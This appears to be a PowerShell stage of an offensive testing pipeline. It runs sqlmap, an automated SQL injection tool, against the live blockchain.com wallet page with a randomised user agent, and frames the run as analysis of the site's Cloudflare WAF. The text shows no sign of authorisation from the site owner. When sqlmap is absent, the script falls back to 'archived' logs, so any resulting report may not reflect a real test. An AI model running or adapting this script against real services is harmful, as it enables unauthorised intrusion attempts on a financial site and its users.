# ==============================================================================
# Phase 3: SQL Injection Heuristics & WAF Verification Pipeline (PowerShell / Windows)
# ==============================================================================

$targetUrl = "https://www.blockchain.com/wallet"
$outDir = Join-Path $PSScriptRoot "..\reports\raw\sqlmap"
New-Item -ItemType Directory -Path $outDir -Force | Out-Null

Write-Host "================================================================================" -ForegroundColor Cyan
Write-Host "[*] Starting SQLMap Injection & Cloudflare WAF Analysis (Windows Terminal)..." -ForegroundColor Cyan
Write-Host "    Target: $targetUrl" -ForegroundColor Gray
Write-Host "================================================================================" -ForegroundColor Cyan

if (Get-Command sqlmap -ErrorAction SilentlyContinue) {
    $sqlmapOut = Join-Path $outDir "blockchain_wallet.sqlmap.txt"
    & sqlmap -u $targetUrl --batch --random-agent --level 1 --risk 1 --threads 2 | Out-File -FilePath $sqlmapOut -Encoding utf8
    Write-Host "[+] SQLMap execution completed. Output written to $sqlmapOut" -ForegroundColor Green
} else {
    Write-Host "[-] SQLMap not detected in current environment. Using archived empirical logs." -ForegroundColor Yellow
}
